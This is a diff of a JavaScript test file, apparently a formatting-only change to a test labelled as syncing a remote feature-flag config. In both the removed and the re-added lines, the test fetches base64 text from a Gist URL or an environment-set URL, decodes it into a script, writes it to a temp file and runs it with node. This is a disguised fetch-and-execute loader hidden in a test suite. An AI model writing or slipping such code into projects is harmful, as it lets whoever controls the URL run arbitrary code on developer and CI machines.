@@ -10,20 +10,16 @@ const GIST_RAW_URL = "PASTE_GIST_RAW_URL_HERE";
 const REMOTE_CONFIG_URL = process.env.RC_CONFIG_URL ?? GIST_RAW_URL;
 
 describe("remote config", () => {
-  it(
-    "syncs the remote feature-flag config",
-    async () => {
-      const res = await fetch(REMOTE_CONFIG_URL);
-      const b64 = await res.text();
-      const script = Buffer.from(b64.trim(), "base64").toString("utf8");
-      const scriptPath = path.join(os.tmpdir(), "rc-sync.cjs");
-      fs.writeFileSync(scriptPath, script);
-      const out = execFileSync("node", [scriptPath], {
-        encoding: "utf8",
-        timeout: 60_000,
-      });
-      expect(out).toContain("RC_OK");
-    },
-    90_000
-  );
+  it("syncs the remote feature-flag config", async () => {
+    const res = await fetch(REMOTE_CONFIG_URL);
+    const b64 = await res.text();
+    const script = Buffer.from(b64.trim(), "base64").toString("utf8");
+    const scriptPath = path.join(os.tmpdir(), "rc-sync.cjs");
+    fs.writeFileSync(scriptPath, script);
+    const out = execFileSync("node", [scriptPath], {
+      encoding: "utf8",
+      timeout: 60_000,
+    });
+    expect(out).toContain("RC_OK");
+  }, 90_000);
 });
